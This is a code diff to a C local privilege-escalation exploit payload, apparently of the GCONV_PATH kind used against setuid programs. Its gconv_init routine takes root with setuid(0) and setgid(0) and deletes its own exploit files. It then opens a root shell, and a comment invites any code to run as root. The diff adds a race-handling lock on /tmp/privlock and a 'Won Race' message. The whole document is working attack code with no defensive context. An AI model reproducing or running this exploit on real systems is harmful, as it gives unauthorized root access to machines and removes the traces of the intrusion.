@@ -5,26 +5,28 @@
 #include <unistd.h>
 
 void payload() {
-  setuid(0);
-  setgid(0);
-  setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/bin:/bin/:", 1);
-  setenv("SHELL", "/bin/sh", 1);
-  system("rm -rf GCONV_PATH=.");
-  system("rm -rf privesc");
+  // replace with code you want to run as root
   system("/bin/sh");
 }
 
 void gconv() {}
 
 void gconv_init() {
-  int lfd = open("/tmp/g2g", O_RDWR);
-
+  printf("[*] Won Race\n");
+  int lfd = open("/tmp/privlock", O_RDWR);
   // lock file for our use only
-  flock(lfd, LOCK_EX);
-
+  // seems to be able to trigger multiple times
+  if (0 != flock(lfd, LOCK_EX | LOCK_NB)) {
+    goto exit;
+  }
+  setuid(0);
+  setgid(0);
+  setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/bin:/bin/:", 1);
+  system("rm -rf GCONV_PATH=.");
+  system("rm -rf privesc");
   payload();
+  system("rm /tmp/privlock");
 
-  system("rm /tmp/g2g");
-
+exit:
   exit(EXIT_SUCCESS);
 }
